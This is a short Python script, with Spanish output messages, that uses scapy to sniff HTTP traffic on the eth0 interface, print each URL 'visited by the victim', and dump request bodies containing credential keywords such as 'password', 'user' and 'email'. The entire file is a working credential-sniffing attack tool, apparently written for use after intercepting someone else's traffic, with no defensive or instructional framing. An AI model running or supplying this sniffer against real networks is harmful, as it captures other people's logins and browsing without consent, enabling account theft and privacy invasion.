#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http
import signal
import sys

def def_handler(sig, frame):
    print("[+] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) #Ctrl + C


def process_packet(packet):

    cred_keywords = ["login", "user", "username", "pass", "password", "uname", "pwd", "passwd", "mail", "email", "mailaddress", "uemail"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(f"[+] URL visitada por la víctima {url}")

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(f"[+] Posibles credenciales: {response}")
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("eth0")

if __name__ == '__main__':
    main()
